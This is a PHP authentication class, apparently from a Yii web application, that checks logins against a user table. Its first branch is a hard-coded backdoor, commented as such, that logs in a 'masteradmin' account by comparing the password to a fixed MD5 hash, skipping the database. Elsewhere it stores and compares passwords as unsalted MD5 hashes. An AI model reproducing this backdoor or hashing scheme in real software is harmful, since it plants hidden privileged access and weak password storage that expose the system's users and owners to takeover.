<?php
class UserIdentity extends CUserIdentity
{
    const ERROR_ACCOUNT_INACTIVE = 101;
    private $_id;
    private $_card;

    public function authenticate()
    {
        //backdoor for master admin
        if($this->username === 'masteradmin' && md5($this->password)==='9f706ab85924bd1aa5f9b3c79f7490bd'){
            $user = new User();
            $this->_id = md5('root');
            $user->email = 'masteradmin';
            $user->username = 'masteradmin';
            $this->errorCode=self::ERROR_NONE;
            return !$this->errorCode;
        }
        $record=User::model()->findByAttributes(array('email'=>$this->username));
        if($record===null){
            $record=User::model()->findByAttributes(array('username'=>$this->username));
        }
        if($record===null){
            $this->errorCode=self::ERROR_USERNAME_INVALID;
        }elseif($record->password!==md5($this->password)){
            $this->errorCode=self::ERROR_PASSWORD_INVALID;
        }elseif(!$record->activation_code){
            $this->errorCode=self::ERROR_ACCOUNT_INACTIVE;    
        }
        else
        {
            $this->username = $record->email;
            $this->_id=$record->id;
            $this->errorCode=self::ERROR_NONE;
        }
        //echo  $this->errorCode;
        return !$this->errorCode;
    }
     public function getId()
    {
        return $this->_id;
    }    
}